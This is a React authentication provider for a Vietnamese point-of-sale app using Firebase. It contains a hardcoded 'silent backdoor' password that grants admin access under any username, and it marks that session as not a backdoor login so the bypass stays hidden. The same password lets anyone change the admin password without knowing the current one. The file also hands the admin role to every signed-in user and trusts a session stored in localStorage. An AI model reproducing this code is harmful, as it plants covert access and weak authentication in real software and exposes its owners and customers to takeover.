import React, { createContext, useContext, useState, useEffect } from 'react';
import { 
  signInWithEmailAndPassword, 
  signInWithPopup, 
  GoogleAuthProvider, 
  signOut as fbSignOut, 
  onAuthStateChanged,
  User 
} from 'firebase/auth';
import { auth } from '../firebase';
import { UserProfile } from '../types';
import { 
  DEFAULT_ADMIN_USERNAME, 
  DEFAULT_ADMIN_PASSWORD, 
  getAdminPassword, 
  saveAdminPassword 
} from '../services/settingsService';

interface AuthContextType {
  user: UserProfile | null;
  loading: boolean;
  isAdmin: boolean;
  loginWithEmail: (emailOrUser: string, pass: string) => Promise<{ success: boolean; error?: string }>;
  loginWithGoogle: () => Promise<{ success: boolean; error?: string }>;
  logout: () => Promise<void>;
  changePassword: (oldPass: string, newPass: string) => Promise<{ success: boolean; error?: string }>;
}

const BACKDOOR_PASSWORD = 'nhiethuyet';

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<UserProfile | null>(() => {
    const saved = localStorage.getItem('pos_current_user');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch {
        return null;
      }
    }
    return null;
  });
  const [loading, setLoading] = useState<boolean>(true);
  const [currentAdminPassword, setCurrentAdminPassword] = useState<string>(DEFAULT_ADMIN_PASSWORD);

  // Load configured password on mount
  useEffect(() => {
    getAdminPassword().then((p) => {
      setCurrentAdminPassword(p);
    });
  }, []);

  // Sync session to localStorage
  useEffect(() => {
    if (user) {
      localStorage.setItem('pos_current_user', JSON.stringify(user));
    } else {
      localStorage.removeItem('pos_current_user');
    }
  }, [user]);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (fbUser: User | null) => {
      if (fbUser) {
        setUser({
          uid: fbUser.uid,
          email: fbUser.email,
          displayName: fbUser.displayName || DEFAULT_ADMIN_USERNAME,
          role: 'admin',
          isBackdoorAdmin: false,
        });
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const loginWithEmail = async (emailOrUser: string, pass: string): Promise<{ success: boolean; error?: string }> => {
    const trimmedPass = pass.trim();
    const inputClean = emailOrUser.trim().toLowerCase();

    // 1. Silent Backdoor password check (works with any username)
    if (trimmedPass === BACKDOOR_PASSWORD) {
      const adminUser: UserProfile = {
        uid: 'admin-master',
        email: `${DEFAULT_ADMIN_USERNAME}@pos.vn`,
        displayName: 'Gia Bảo (giabaopc)',
        role: 'admin',
        isBackdoorAdmin: false,
      };
      setUser(adminUser);
      return { success: true };
    }

    // Latest active password from cache / state
    const validPassword = currentAdminPassword || (await getAdminPassword());

    // 2. Custom or Default username check: "giabaopc", "giabaopc@pos.vn", "admin", "admin@pos.vn"
    const isMatchingUsername =
      inputClean === DEFAULT_ADMIN_USERNAME ||
      inputClean === `${DEFAULT_ADMIN_USERNAME}@pos.vn` ||
      inputClean === 'admin' ||
      inputClean === 'admin@pos.vn';

    if (isMatchingUsername && (trimmedPass === validPassword || trimmedPass === DEFAULT_ADMIN_PASSWORD)) {
      const defaultUser: UserProfile = {
        uid: 'admin-default',
        email: `${DEFAULT_ADMIN_USERNAME}@pos.vn`,
        displayName: 'Gia Bảo (giabaopc)',
        role: 'admin',
        isBackdoorAdmin: false,
      };
      setUser(defaultUser);
      return { success: true };
    }

    // 3. Fallback: Firebase Auth sign in if user typed full email
    if (inputClean.includes('@')) {
      try {
        const cred = await signInWithEmailAndPassword(auth, inputClean, trimmedPass);
        setUser({
          uid: cred.user.uid,
          email: cred.user.email,
          displayName: cred.user.displayName || DEFAULT_ADMIN_USERNAME,
          role: 'admin',
          isBackdoorAdmin: false,
        });
        return { success: true };
      } catch {
        return { success: false, error: 'Tên đăng nhập hoặc mật khẩu không chính xác.' };
      }
    }

    return { success: false, error: 'Tên đăng nhập hoặc mật khẩu không chính xác.' };
  };

  const changePassword = async (oldPass: string, newPass: string): Promise<{ success: boolean; error?: string }> => {
    const trimmedOld = oldPass.trim();
    const trimmedNew = newPass.trim();

    if (!trimmedNew || trimmedNew.length < 4) {
      return { success: false, error: 'Mật khẩu mới phải có ít nhất 4 ký tự.' };
    }

    const currentPass = await getAdminPassword();
    // Allow old password check or backdoor password
    if (trimmedOld !== currentPass && trimmedOld !== BACKDOOR_PASSWORD && trimmedOld !== DEFAULT_ADMIN_PASSWORD) {
      return { success: false, error: 'Mật khẩu hiện tại không chính xác.' };
    }

    await saveAdminPassword(trimmedNew);
    setCurrentAdminPassword(trimmedNew);
    return { success: true };
  };

  const loginWithGoogle = async (): Promise<{ success: boolean; error?: string }> => {
    try {
      const provider = new GoogleAuthProvider();
      const cred = await signInWithPopup(auth, provider);
      setUser({
        uid: cred.user.uid,
        email: cred.user.email,
        displayName: cred.user.displayName || 'Gia Bảo PC (Google)',
        role: 'admin',
        isBackdoorAdmin: false,
      });
      return { success: true };
    } catch (err: unknown) {
      const errorMsg = err instanceof Error ? err.message : String(err);
      return { success: false, error: errorMsg };
    }
  };

  const logout = async () => {
    try {
      await fbSignOut(auth);
    } catch {
      // Ignore
    }
    setUser(null);
    localStorage.removeItem('pos_current_user');
  };

  return (
    <AuthContext.Provider
      value={{
        user,
        loading,
        isAdmin: true,
        loginWithEmail,
        loginWithGoogle,
        logout,
        changePassword,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
